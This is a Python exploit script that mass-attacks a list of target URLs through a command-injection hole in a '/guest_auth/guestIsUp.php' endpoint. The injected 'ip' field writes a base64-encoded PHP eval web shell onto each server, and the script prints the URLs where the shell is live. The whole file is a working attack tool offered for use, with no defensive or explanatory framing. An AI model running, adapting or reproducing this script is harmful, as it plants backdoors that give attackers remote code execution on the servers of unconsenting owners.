'''
Descripttion: 
Author: yumu
Email: 2@33.al
Date: 2021-01-12 13:19:40
LastEditors: yumu
LastEditTime: 2021-01-13 09:20:10
'''
import requests
import sys
import urllib3
import random
urllib3.disable_warnings()

def main(targets):
    ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
    header = {
        "user-agent":ua
    }
    shellcontent = "PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg==" # cat shell.php | base64
    with open(targets) as f:
        for target in f.readlines():
            target = target.strip()
            url = target + "/guest_auth/guestIsUp.php"
            shellname = str(random.randrange(8888,9999))+'.php'
            data = 'ip=127.0.0.1|echo "'+shellcontent+'"|base64 -d > '+shellname+'&mac=00-00'
            try:
                requests.post(url,data=data,headers= {"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","user-agent":ua},verify=False,timeout=5)
            except:
                #print("timeout")
                continue
            url = target + '/guest_auth/'+shellname
            if(requests.get(url,headers=header,verify=False).status_code==200):
                print(url)
            else:
                pass
                #print("不成功")
                # 不成功
if __name__ == "__main__":
    if(len(sys.argv)==2):
        targets = sys.argv[1]
        main(targets)
    else:
        print("usage: python3 eg.py urls.txt")
